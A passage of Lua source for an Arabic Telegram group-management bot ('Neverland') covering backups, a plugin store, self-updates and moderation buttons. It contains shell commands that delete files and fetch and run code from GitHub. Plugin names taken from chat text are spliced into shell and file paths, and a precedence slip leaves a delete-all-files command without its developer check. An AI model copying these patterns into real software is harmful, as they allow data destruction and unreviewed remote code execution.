send(msg.chat_id_, msg.id_,'*✦┇عذا الامر للمطور الاساسي فقط .*')
end
if text == 'رفع نسخه احتياطيه ↞' then
database:set(bot_id..'docu:Bots',true) 
send(msg.chat_id_, msg.id_, "*✦┇ قم الان بارسال ملف النسخه الاحتياطيه*")
end
if msg.content_.ID == "MessageDocument" and database:get(bot_id..'docu:Bots') then    
local ID_FILE = msg.content_.document_.document_.persistent_id_ 
local File_Name = msg.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
database:del(bot_id..'docu:Bots') 
end
if text == 'نسخه احتياطيه ↞' then
local list = database:smembers(bot_id..'Chek:Groups')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Neverland Chat'
ASAS = database:smembers(bot_id.."Neverland:Basic:Constructor"..v)
MNSH = database:smembers(bot_id.."Neverland:Constructor"..v)
MDER = database:smembers(bot_id.."Neverland:Manager"..v)
MOD = database:smembers(bot_id.."Neverland:Mod:User"..v)
link = database:get(bot_id.."Neverland:Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Neverland":"'..NAME..'",'
else
t = t..',"'..v..'":{"Neverland":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', '✦┇عدد مجموعات التي في البوت { '..#list..'}')
end

if text == 'الملفات' or text == 'الملفات ↞' and DevNeverland(msg) then
t = '✦┇جميع الملفات : \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n'
i = 0
for v in io.popen('ls Neverland_Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'*~ '..v..'*\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "مسح جميع الملفات" or text == 'مسح جميع الملفات ↞' and DevNeverland(msg) then
os.execute("rm -fr Neverland_Files/*")
send(msg.chat_id_,msg.id_,"✦┇تم حذف جميع الملفات")
return false
end
if text == "متجر الملفات ↞" or text == 'المتجر' and DevNeverland(msg) then
if DevNeverland(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TEAMNeverland/files_Neverland/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✦┇اهلا بك في متجر ملفات نيفرلاند\n✦┇يوجد في المتجر ملف الردود\n✦┇يتم ادراج الملفات في التحديثات القادمه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
local TextE = "\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n✦┇تدل علامة (✔) الملف مفعل\n".."✦┇تدل علامة (✖) الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("Neverland_Files/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(✔)"
else
CeckFile = "(✖)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."↜* {`"..name..'`} ↜ '..CeckFile..'\n[-  About to the file]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and DevNeverland(msg) then
local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("Neverland_Files/"..file,"r")
if file_bot then
io.close(file_bot)
t = "*✦┇الملف ↜ {"..file.."}\n✦┇تم تعطيله وحذفه بنجاح \n✓*"
else
t = "*✦┇بالتاكيد تم تعطيل وحذف ملف ↜ {"..file.."} \n✓*"
end
local json_file, res = https.request("https://raw.githubusercontent.com/TEAMNeverland/files_Neverland/master/files_Neverland/"..file)
if res == 200 then
os.execute("rm -fr Neverland_Files/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('Neverland.lua')  
else
send(msg.chat_id_, msg.id_,"*✦┇عذرا لا يوجد هاكذا ملف في المتجر *\n") 
end
return false
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and DevNeverland(msg) then
local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("Neverland_Files/"..file,"r")
if file_bot then
io.close(file_bot)
t = "*✦┇بالتاكيد تم تنزيل وتفعيل ملف ↜ {"..file.."} \n✓*"
else
t = "*✦┇الملف ↜ {"..file.."}\n✦┇تم تنزيله وتفعيله بنجاح \n*"
end
local json_file, res = https.request("https://raw.githubusercontent.com/TEAMNeverland/files_Neverland/master/files_Neverland/"..file)
if res == 200 then
local chek = io.open("Neverland_Files/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('Neverland.lua')  
else
send(msg.chat_id_, msg.id_,"*✦┇عذرا لا يوجد هاكذا ملف في المتجر *\n") 
end
return false
end
if text == "تحديث السورس ↞" then
send(msg.chat_id_, msg.id_,' *✦┇تم تحديث السورس* \n*✦┇لديك اخر اصدار لسورس نيفرلاند*\n*✦┇الاصدار » { 3.0v}*')
os.execute('rm -rf Neverland.lua')
os.execute('rm -rf start.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/Neverland.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/start.lua')
dofile('Neverland.lua')  
return false
end
if text == "تحديث ↞" then
dofile("Neverland.lua")  
send(msg.chat_id_, msg.id_, "*✦┇تم التحديث*")
end
end
end --- Chat_Type = 'UserBot' 
end
end
function tdcli_update_callback(data)
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
t = "قام احد المنشئين بطرد البوت من مجموعته\n\n"
tdcli_function({ID ="GetChat",chat_id_="-100"..data.channel_.id_},function(arg,chat)  
local NameChat = chat.title_
t =t.."اسم المجموعه\n"..NameChat
local IdChat = "-100"..data.channel_.id_
t =t.."\n\nايدي المجموعه\n"..IdChat
send(Id_Sudo, msg.id_,t)
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
end,nil)
end
end
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local From_id = data.id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local DAata = data.payload_.data_
local Text = data.payload_.data_

if Text and Text:match('(.*)/delamr') then
local Userid = Text:match('(.*)/delamr')
if tonumber(Userid) ~= tonumber(data.sender_user_id_) then
https.request("https://api.telegram.org/bot"..token..'/answerCallbackQuery?callback_query_id='..data.id_..'&text='..URL.escape('الامر لا يخصك')..'&show_alert=true')
end
DeleteMessage(data.chat_id_, {[0] = Msg_id})  
end

if Text and Text:match('/locall@(.*):(.*)') then
local Userid = {Text:match('/locall@(.*):(.*)')}
if tonumber(Userid[2]) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:tagservrbot"..Userid[1],true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..'Neverland:'..lock..Userid[1],"del")    
end
https.request("https://api.telegram.org/bot"..token..'/answerCallbackQuery?callback_query_id='..data.id_..'&text='..URL.escape('تم قفل الكل')..'&show_alert=true')
end
end

if Text and Text:match('/addadmin@(.*):(.*)') then
local Userid = {Text:match('/addadmin@(.*):(.*)')}
if tonumber(Userid[2]) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = Userid[1]:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..Userid[1], admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..Userid[1], admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..Userid[1], admins[i].user_id_)
end
end
end,nil)   
tdcli_function ({ID = "GetChannelMembers",channel_id_ = Userid[1]:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
return false  
end
local UserName = (b.username_ or "TEAM_Neverland")
database:sadd(bot_id.."Basic:Constructor"..Userid[1],b.id_)
end,nil)   
end,nil)   
https.request("https://api.telegram.org/bot"..token..'/answerCallbackQuery?callback_query_id='..data.id_..'&text='..URL.escape('تم رفع الادمنيه والمالك')..'&show_alert=true')
end
end
if Text and Text:match('/leftbot@(.*)') then
local Userid = Text:match('/leftbot@(.*)')
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=Userid,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
https.request("https://api.telegram.org/bot"..token..'/answerCallbackQuery?callback_query_id='..data.id_..'&text='..URL.escape('تم مغادرة البوت')..'&show_alert=true')
end
if Text and Text:match('(.*)/unktm(.*)') then
local Userid = {Text:match('(.*)/unktm(.*)')}
if tonumber(Userid[1]) == tonumber(data.sender_user_id_) then
database:srem(bot_id.."Neverland:Muted:User"..data.chat_id_, Userid[2])
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم الغاء الكتم عنه*')..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
end
if Text and Text:match('(.*)/unban(.*)') then
local Userid = {Text:match('(.*)/unban(.*)')}
if tonumber(Userid[1]) == tonumber(data.sender_user_id_) then
database:srem(bot_id.."Neverland:Ban:User"..data.chat_id_, Userid[2])
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم الغاء الحظر عنه*')..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
end
if Text and Text:match('(.*)/unkkid(.*)') then
local Userid = {Text:match('(.*)/unkkid(.*)')}
if tonumber(Userid[1]) == tonumber(data.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. Userid[2] .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم الغاء التقييد عنه*')..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
end
if Text and Text:match('(.*)/unktm(.*)') then
local Userid = {Text:match('(.*)/unktm(.*)')}
if tonumber(Userid[1]) == tonumber(data.sender_user_id_) then
database:srem(bot_id.."Neverland:Muted:User"..data.chat_id_, Userid[2])
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم الغاء الكتم عنه*')..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
end
if Text and Text:match('(.*)/unban(.*)') then
local Userid = {Text:match('(.*)/unban(.*)')}
if tonumber(Userid[1]) == tonumber(data.sender_user_id_) then
database:srem(bot_id.."Neverland:Ban:User"..data.chat_id_, Userid[2])
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم الغاء الحظر عنه*')..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
end
if Text and Text:match('(.*)/unkkid(.*)') then
local Userid = {Text:match('(.*)/unkkid(.*)')}
if tonumber(Userid[1]) == tonumber(data.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. Userid[2] .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم الغاء التقييد عنه*')..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
end

if Text and Text:match('(.*)/del1gif') then
if tonumber(Text:match('(.*)/del1gif')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Gif"..v..data.chat_id_) then
database:del(bot_id.."Neverland:Add:Rd:Manager:Gif"..v..data.chat_id_)   
database:srem(bot_id.."Neverland:List:Manager"..data.chat_id_,v)
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم مسح ردود المتحركه*')..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/del1stik') then
if tonumber(Text:match('(.*)/del1stik')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..v..data.chat_id_) then
database:del(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..v..data.chat_id_)   
database:srem(bot_id.."Neverland:List:Manager"..data.chat_id_,v)
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم مسح ردود الملصقات*')..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/del1text') then
if tonumber(Text:match('(.*)/del1text')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Text"..v..data.chat_id_) then
database:del(bot_id.."Neverland:Add:Rd:Manager:Text"..v..data.chat_id_)   
database:srem(bot_id.."Neverland:List:Manager"..data.chat_id_,v)
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم مسح ردود النصيه*')..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/del1mp3') then
if tonumber(Text:match('(.*)/del1mp3')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:File"..v..data.chat_id_) then
database:del(bot_id.."Neverland:Add:Rd:Manager:File"..v..data.chat_id_)   
database:srem(bot_id.."Neverland:List:Manager"..data.chat_id_,v)
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم مسح ردود Mp3*')..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/del1ogg') then
if tonumber(Text:match('(.*)/del1ogg')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Vico"..v..data.chat_id_) then
database:del(bot_id.."Neverland:Add:Rd:Manager:Vico"..v..data.chat_id_)   
database:srem(bot_id.."Neverland:List:Manager"..data.chat_id_,v)
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape('*- تم مسح ردود البصمات*')..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/golistmderreply') then
if tonumber(Text:match('(.*)/golistmderreply')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown') 
end
local texte = '- ردود المجموعه'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'المتحركه', callback_data=data.sender_user_id_.."/delereplygif"},{text = 'النصيه', callback_data=data.sender_user_id_.."/delereplytext"},
},
{
{text = 'الملصقات', callback_data=data.sender_user_id_.."/delereplystickar"},{text = 'الصوتيات', callback_data=data.sender_user_id_.."/delereplyogg"},
},
{
{text = 'ال mp3', callback_data=data.sender_user_id_.."/delereplymp3"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/delereplygif') then
if tonumber(Text:match('(.*)/delereplygif')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return send(data.chat_id_, Msg_id,"["..text.."]")
end
text = ""
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Gif"..v..data.chat_id_) then
text = text..""..k.." - "..v.." \n"
else
text = text.."✦┇لا يوجد ردود متحركه"
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح ردود المتحركه', callback_data=data.sender_user_id_.."/del1gif"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/delereplytext') then
if tonumber(Text:match('(.*)/delereplytext')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return send(data.chat_id_, Msg_id,"["..text.."]")
end
text = ""
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Text"..v..data.chat_id_) then
text = text..""..k.." - "..v.." \n"
else
text = text.."✦┇لا يوجد ردود نصيه"
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح ردود النصيه', callback_data=data.sender_user_id_.."/del1text"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/delereplystickar') then
if tonumber(Text:match('(.*)/delereplystickar')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return send(data.chat_id_, Msg_id,"["..text.."]")
end
text = ""
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..v..data.chat_id_) then
text = text..""..k.." - "..v.." \n"
else
text = text.."✦┇لا يوجد ردود ملصقات"
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح ردود الملصقات', callback_data=data.sender_user_id_.."/del1stik"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/delereplyogg') then
if tonumber(Text:match('(.*)/delereplyogg')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return send(data.chat_id_, Msg_id,"["..text.."]")
end
text = ""
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:Gif"..v..data.chat_id_) then
text = text..""..k.." - "..v.." \n"
else
text = text.."✦┇لا يوجد ردود بصمات"
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح ردود البصمات', callback_data=data.sender_user_id_.."/del1ogg"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/delereplymp3') then
if tonumber(Text:match('(.*)/delereplymp3')) == tonumber(data.sender_user_id_) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..data.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return send(data.chat_id_, Msg_id,"["..text.."]")
end
text = ""
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Manager:File"..v..data.chat_id_) then
text = text..""..k.." - "..v.." \n"
else
text = text.."✦┇لا يوجد ردود Mp3"
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مسح ردود الMp3', callback_data=data.sender_user_id_.."/del1mp3"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/golistmderreply"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end

if Text and Text:match('(.*)/delDevv') and VIP_DeV(data) then
if tonumber(Text:match('(.*)/delDevv')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."DEV:Sudo:T")
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح قائمة الثانويين")
end
end
if Text and Text:match('(.*)/delsudos') and VIP_DeV(data) then
if tonumber(Text:match('(.*)/delsudos')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Sudo:User")
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح قائمة المطورين")
end
end
if Text and Text:match('(.*)/deldelcreatorr') and DevBot(data) then
if tonumber(Text:match('(.*)/delcreatorr')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."creator"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المالكين في المجموعة")
end
end
if Text and Text:match('(.*)/delassaseen') and DevBot(data) then
if tonumber(Text:match('(.*)/delassaseen')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Basic:Constructor"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المنشئين الاساسيين في المجموعه")
end
end
if Text and Text:match('(.*)/delmnsh') and BasicConstructor(data) then
if tonumber(Text:match('(.*)/delmnsh')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Constructor"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المنشئين في المجموعه")
end
end
if Text and Text:match('(.*)/delmoder') and Constructor(data) then
if tonumber(Text:match('(.*)/delmoder')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Manager"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المدراء في المجموعه")
end
end
if Text and Text:match('(.*)/deladmin') and Owner(data) then
if tonumber(Text:match('(.*)/deladmin')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Mod:User"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح الادمنيه في المجموعه")
end
end
if Text and Text:match('(.*)/delvips') and Addictive(data) then
if tonumber(Text:match('(.*)/delvips')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Special:User"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المميزين في المجموعه")
end
end
if Text and Text:match('(.*)/delCmdd') and Addictive(data) then
if tonumber(Text:match('(.*)/delCmdd')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:List:Cmd:Group:New"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح الاوامر المضافه في المجموعه")
end
end
if Text and Text:match('(.*)/delcleanerr') and Addictive(data) then
if tonumber(Text:match('(.*)/delcleanerr')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:MN:TF"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المنظفين في المجموعه")
end
end
if Text and Text:match('(.*)/delbanall') and DevBot(data) then
if tonumber(Text:match('(.*)/delbanall')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:GBan:User"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المحظورين عام من البوت")
end
end
if Text and Text:match('(.*)/delban') and Addictive(data) then
if tonumber(Text:match('(.*)/delban')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Ban:User"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المحظورين في المجموعه")
end
end
if Text and Text:match('(.*)/delktm') and Addictive(data) then
if tonumber(Text:match('(.*)/delktm')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Muted:User"..data.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم مسح المكتومين في المجموعه")
end
end
if Text and Text:match('(.*)/delrd') and Addictive(data) then
if tonumber(Text:match('(.*)/delrd')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
Edit_Msgees("sendok",data.chat_id_,data.sender_user_id_,data.message_id_, "✦┇تم الغاء الامر")
end
end

if Text and Text:match('(%d+)/UnKed@(%d+):(%d+)') then
local ramsesadd = {string.match(Text,"^(%d+)/UnKed@(%d+):(%d+)$")}
if tonumber(ramsesadd[2]) == tonumber(ramsesadd[3]) then
if tonumber(ramsesadd[1]) == tonumber(data.sender_user_id_) then
DeleteMessage(data.chat_id_, {[0] = Msg_id})  
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
end
end
end


if Text and Text:match('(.*)/mute_text') then
if tonumber(Text:match('(.*)/mute_text')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:text"..data.chat_id_,true) 
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_bots') then
if tonumber(Text:match('(.*)/lock_bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Bot:kick"..data.chat_id_,"kick")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_tgservice') then
if tonumber(Text:match('(.*)/mute_tgservice')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:tagservr"..data.chat_id_,true)  
